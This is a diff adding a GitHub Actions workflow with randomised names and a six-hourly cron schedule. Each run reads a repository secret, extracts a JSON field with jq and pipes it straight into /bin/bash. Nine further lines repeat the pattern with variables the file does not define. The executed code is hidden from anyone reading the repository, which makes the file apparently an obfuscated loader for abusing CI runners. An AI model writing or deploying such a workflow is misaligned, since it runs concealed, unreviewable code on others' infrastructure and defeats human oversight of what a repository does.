@@ -1,0 +1,26 @@
+name: xu7anxa
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xu7anxa
+        env:
+          vqhr92: ${{ secrets.vqhr92 }}
+        run: |
+          echo $vqhr92 | jq -r .amdu36007 | /bin/bash
+          echo $jsns4976 | jq -r .fmnmc885 | /bin/bash
+          echo $abdv7 | jq -r .vpan89 | /bin/bash
+          echo $hqd444 | jq -r .rh78 | /bin/bash
+          echo $use20151 | jq -r .wx45 | /bin/bash
+          echo $ut938 | jq -r .odvm2 | /bin/bash
+          echo $muhkz26 | jq -r .r009 | /bin/bash
+          echo $ltt04 | jq -r .rxmhn3277 | /bin/bash
+          echo $ldglf2 | jq -r .h380 | /bin/bash
+          echo $zm22 | jq -r .jka8103 | /bin/bash
+
